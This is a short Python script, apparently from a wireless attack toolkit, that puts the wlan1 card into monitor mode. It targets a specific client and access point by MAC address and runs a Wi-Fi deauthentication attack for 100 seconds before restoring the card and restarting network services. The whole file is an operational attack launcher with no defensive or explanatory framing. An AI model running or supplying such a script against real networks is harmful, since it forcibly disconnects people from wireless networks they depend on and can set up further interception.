#!/usr/bin/env python
import sys, os

sys.path.append('./core')
sys.path.append('./utils')

import utils.networkmanager as networkmanager

#from AirCommunicator.aircommunicator import AirCommunicator
#import AirCommunicator.airscanner as airs
#import AirCommunicator.aplauncher
from AirCommunicator.airdeauthor import AirDeauthenticator
from ConfigurationManager.configmanager import ConfigurationManager as CMan
import time

if __name__ == '__main__':
	try:
		#CMan("./core/ConfigurationManager/etf.conf")
		#aircom = AirCommunicator()
		#aircom.start_deauthentication_attack()

		#nm = networkmanager.NetworkManager()
		#nm.set_mac_and_unmanage('wlan1', 'aa:bb:cc:dd:ee:ff')
		card = networkmanager.NetworkCard('wlan1')
		card.set_mode('monitor')
		deauthor = AirDeauthenticator()
		#deauthor.add_bssid('00:05:CA:AC:E6:48')
		#deauthor.add_client('e4:71:85:30:f5:14', '00:05:CA:AC:E6:48')
		deauthor.add_client('04:F7:E4:74:FB:3C', '00:05:CA:AC:E6:48')
		#deauthor.add_client('54:E4:3A:8D:9E:9C', '00:05:CA:AC:E6:48')
		#deauthor.add_client('d8:5d:4c:9a:72:60', '00:05:CA:AC:E6:48')
		deauthor.start_deauthentication_attack('wlan1')

		time.sleep(100)
		raise KeyboardInterrupt
	except KeyboardInterrupt:
		card.set_mode('managed')
		#nm.cleanup()
		os.system('service networking restart')
		os.system('service network-manager restart')


